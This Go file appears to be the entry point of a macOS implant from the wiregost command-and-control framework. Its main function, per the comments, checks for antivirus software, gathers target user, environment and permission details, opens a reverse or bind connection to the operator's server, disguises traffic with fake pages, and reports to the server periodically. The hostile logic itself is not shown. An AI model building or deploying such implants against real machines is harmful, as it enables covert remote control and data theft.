package darwin

import (
	"github.com/maxlandon/wiregost/ghost/assets"
	"github.com/maxlandon/wiregost/ghost/c2"
	"github.com/maxlandon/wiregost/ghost/c2/route"
	"github.com/maxlandon/wiregost/ghost/core/generic/channels"
	"github.com/maxlandon/wiregost/ghost/core/generic/info"
	"github.com/maxlandon/wiregost/ghost/log"
	"github.com/maxlandon/wiregost/ghost/profile"
	"github.com/maxlandon/wiregost/ghost/rpc"
	"github.com/maxlandon/wiregost/ghost/security"
)

func main() {

	// Core Settings & Security -----------------------------------------------------------------

	// Gather and check all compile-time variables/configuration
	assets.SetupImplantAssets()

	// Init logging
	log.SetupLogging()

	// Implant concurrency management.
	channels.SetupChannels()

	// Various Security checks (antivirus software running, etc)
	security.SetupSecurity()

	// Ghost info, networks available, users connected, env variables
	// Permissions, Owner, OS details, OS specific information.
	info.LoadTargetInformation()

	// Communications & Routing -----------------------------------------------------------------

	// Set network security & credentials
	// Authorisations to connect to listener, fake front pages/redirections
	// credentials, certificates, etc...
	c2.SetupSecurity()

	// Reverse connect or bind listener (goroutine, + send information)
	c2.InitGhostComms()

	// Register RPC services if listener
	rpc.InitGhostRPC()

	// Open routes given by server. Check all security details (fake pages,
	// credentials and authorisations.)
	route.InitRouting()

	// OS-Specific -----------------------------------------------------------------------------

	// Windows: Load and setup all Windows-related objects/functions

	// Other -----------------------------------------------------------------------------------

	// Monitor performance and resource usage, profiling.
	// (Sends reports to server every once in while.) (Plays as a blocking function)
	profile.StartRuntimeControl()
}
